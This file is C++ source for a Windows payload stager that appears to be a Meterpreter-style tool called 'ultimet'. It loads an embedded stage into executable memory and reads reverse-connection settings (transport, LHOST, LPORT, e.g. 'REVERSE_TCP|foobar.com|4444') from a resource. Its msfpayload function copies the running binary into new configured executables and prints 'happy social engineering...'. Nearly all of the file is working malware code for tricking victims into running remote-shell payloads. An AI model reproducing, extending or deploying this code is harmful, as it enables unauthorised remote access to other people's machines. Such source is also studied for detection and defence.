//»”„ «··Â «·—Õ„‰ «·—ÕÌ„
//functions needed to fill buffer with stage from resource.

#include "main.h"

//get resource by name & type, 
//virutalalloc (resource size) of memory,
//copy contents of the resource to the buffer,
// return resource size, -1 if unsuccessful.
DWORD ResourceToBuffer(WORD wResourceID, LPCTSTR lpType, unsigned char** buffer) 

{
	HGLOBAL hRes = 0;
	HRSRC hResInfo = 0;
	LPVOID tempBuffer = nullptr;
	DWORD tempByteCount = 0;

	hResInfo = FindResource(NULL, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return 0;

	hRes = LoadResource(NULL, hResInfo);
	if (hRes == NULL) return 0;

	tempByteCount = SizeofResource(NULL,hResInfo); // Get the resource size in bytes
	tempBuffer = LockResource(hRes); //pointer to the data

	*buffer = (unsigned char*)VirtualAlloc(0, tempByteCount+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //allocate memory, make it executable
	memcpy_s(*buffer,tempByteCount,tempBuffer,tempByteCount); //copy stuff to buffer

	FreeResource(hRes);
	return tempByteCount;
}

//This function will read options from a resource, if it exist, and populate the variables  ... will return false when something goes wrong.
BOOL GetOptionsFromResource(wchar_t *transport, wchar_t *lhost, wchar_t *lport)
{
	HRSRC hResInfo = 0;
	HGLOBAL hRes = 0;			//
	LPVOID tempBuffer = nullptr;//
	char cOptions[128] = {0};	//options will be copied to here
	DWORD tempByteCount = 0;	//
	int counter = 0;			//Generic counter

	char ANSItransport[64] = {0};
	char ANSIlhost[128] = {0};
	char ANSIlport[32] = {0};

	wchar_t UNICODEtransport[64] = {0};
	wchar_t UNICODElhost[128] = {0};
	wchar_t UNICODElport[32] = {0};

	hResInfo = FindResourceW(NULL, MAKEINTRESOURCE(103), (LPCTSTR)L"BINARY"); //That's hardcoded ... TYPE:BINARY RESOURCE_ID:103
	if (hResInfo == NULL) return false;

	hRes = LoadResource(NULL, hResInfo);
	if (hRes == NULL) return false;


	tempByteCount = SizeofResource(NULL,hResInfo); // Get the resource size in bytes
	tempBuffer = LockResource(hRes); //pointer to the data
	memcpy_s(cOptions, sizeof(cOptions)-1, tempBuffer, tempByteCount); //copy contents of resource to the options string

	//Checking if the resource contains valid options
	//the Syntax should be: |UM|TRANSPORT|LHOST|LPORT|
	//						|UM|REVERSE_TCP|foobar.com|4444|
	// By default it will be  |UM|INVALID|INVALID|INVALID|, if this is the case, resource will be ignored.
	//|UM| TODO: this will be the `signature` that could be utilized in the future as a check for (en/de)crypting the resource. 
	//So, the check will do the following: 1: are there 5 "|" chars? 2:are first four bytes "|UM|"?  if not, return false.


	for(int i =0; i< strlen(cOptions); i++)
	{
		if (cOptions[i] == '|') counter++;
	}
	if (counter != 5) return false; // First check

	if (memcmp(cOptions,"|UM|",4) != 0) return false; //Second Check
	//If we got past this, it looks like we have a valid options resource

	//get 
	char* pch = nullptr;
	pch = strtok(cOptions,"|");

	// We already checked that there are 5 `|` chars .., no need to check for if pch == null.
	if(strcmp(pch, "UM") != 0) return false;	//If first token is not UM, return false

	//Get second token, it should be the TRANSPORT
	pch = strtok (NULL, "|");						//point pch to next token
	if(strcmp(pch, "INVALID") == 0) return false;	//if the transport is defualt, return false
	strcpy(ANSItransport,pch);						//Store the transport in the variable.

	//Get Third token, it should be LHOST
	pch = strtok (NULL, "|");						//point pch to next token
	if(strcmp(pch, "INVALID") == 0) return false;	//if LHOST is defualt, return false
	strcpy(ANSIlhost,pch);							//Store the lhost in the variable.

	//Get Fourth token, it should be LPORT
	pch = strtok (NULL, "|");						//point pch to next token
	if(strcmp(pch, "INVALID") == 0) return false;	//if LPORT is defualt, return false
	strcpy(ANSIlport,pch);							//Store the lhost in the variable.

	//Put parsed options to their respective locations after converting to wchar_t
	AnsiToUnicode(ANSItransport, UNICODEtransport);
	AnsiToUnicode(ANSIlhost, UNICODElhost);
	AnsiToUnicode(ANSIlport, UNICODElport);

	wcscpy(transport, UNICODEtransport);
	wcscpy(lhost, UNICODElhost);
	wcscpy(lport, UNICODElport);

	FreeResource(hRes); //everthing is in place, let's cleanup ...
	return true;		// ... and return true
}
void msfpayload(char *transport, char *lhost, char *lport)
{
	char cOptions[128] = {0};
	char cFileName[MAX_PATH] = {0};
	char currentfilename[MAX_PATH] = {0};
	//building the options string
	strcpy_s(cOptions,"|UM|");		//"|UM|"
	strcat_s(cOptions,transport);	//"|UM|TRANSPORT"
	strcat_s(cOptions,"|");			//"|UM|TRANSPORT|"
	strcat_s(cOptions,lhost);		//"|UM|TRANSPORT|LHOST"
	strcat_s(cOptions,"|");			//"|UM|TRANSPORT|LHOST|"
	strcat_s(cOptions,lport);		//"|UM|TRANSPORT|LHOST|LPORT"
	strcat_s(cOptions,"|");			//"|UM|TRANSPORT|LHOST|LPORT|"

	//building the filename
	strcpy_s(cFileName,transport);	
	strcat_s(cFileName,"-");		
	strcat_s(cFileName,lhost);		
	strcat_s(cFileName,"-");		
	strcat_s(cFileName,lport);		
	strcat_s(cFileName,".exe");

	GetModuleFileNameA(NULL,currentfilename, MAX_PATH);
	CopyFileA(currentfilename, cFileName, FALSE);

	HANDLE hResource;
	hResource = BeginUpdateResourceA(cFileName, FALSE);
	if (NULL != hResource)
	{
		if (UpdateResourceW(hResource, (LPCTSTR)L"BINARY", MAKEINTRESOURCE(103), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), cOptions, strlen(cOptions)) != FALSE)
		{
			EndUpdateResource(hResource, FALSE);
			printf("[*] Success! %s created, happy social engineering...\n", cFileName);
		}
		else
		{
			dprintf(L"[!] Error: BeginUpdateResource returned %d \n", GetLastError());
			exit(1);
		}
	}
	else
	{
		dprintf(L"[!] Error: UpdateResource returned %d \n", GetLastError());
		exit(1);
	}
	exit(0);
}


BOOL ResourceOptionsReset(void)
{
	HANDLE hResource;
	char DefaultOptions[] = "|UM|INVALID|INVALID|INVALID|";

	hResource = BeginUpdateResource(L"ultimet_reset.exe", FALSE);
	if (NULL != hResource)
	{
		if (UpdateResourceW(hResource, (LPCTSTR)L"BINARY", MAKEINTRESOURCE(103), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), DefaultOptions, strlen(DefaultOptions)) != FALSE)
		{
			EndUpdateResource(hResource, FALSE);
			dprintf(L"[*] Success! use `ultimet_reset.exe` for a fresh start...\n");
		}
		else
		{
			dprintf(L"[!] Error: BeginUpdateResource returned %d \n", GetLastError());
			return false;
		}
	}
	else
	{
		dprintf(L"[!] Error: UpdateResource returned %d \n", GetLastError());
		return false;
	}
	return true;
}

void RemoveStage(void)
{
	HANDLE hResource;

	hResource = BeginUpdateResource(L"ultimet_no_stage.exe", FALSE);
	if (NULL != hResource)
	{
		if (UpdateResourceW(hResource, (LPCTSTR)L"BINARY", MAKEINTRESOURCE(101), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), NULL, NULL) != FALSE)
		{
			EndUpdateResource(hResource, FALSE);
			dprintf(L"[*] `ultimet_no_stage.exe` created without stage\n");
		}
		else
		{
			dprintf(L"[!] Error: BeginUpdateResource returned %d, was the stage even  included?\n", GetLastError());
			exit(1);
		}
	}
	else
	{
		dprintf(L"[!] Error: UpdateResource returned %d \n", GetLastError());
		exit(1);
	}
}